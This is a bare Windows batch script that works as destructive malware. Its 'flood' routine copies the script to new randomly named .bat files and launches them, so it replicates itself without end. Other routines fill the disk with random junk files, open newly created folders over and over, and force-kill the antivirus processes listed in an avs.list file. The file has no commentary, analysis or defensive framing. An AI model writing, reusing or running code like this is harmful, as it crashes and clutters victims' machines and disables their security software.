@echo off
:main
call flood
call F_Spam
call F_Blast

:flood
set x=%random%
type %0 >> %x%.bat
start %x%.bat

:F_Spam
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%

:F_Blast
set /A FBlast = %random%
md %FBlast%
start %FBlast%

:Kill_AV
for /f "delims=" %%a in (avs.list) do taskkill /f /im %%a
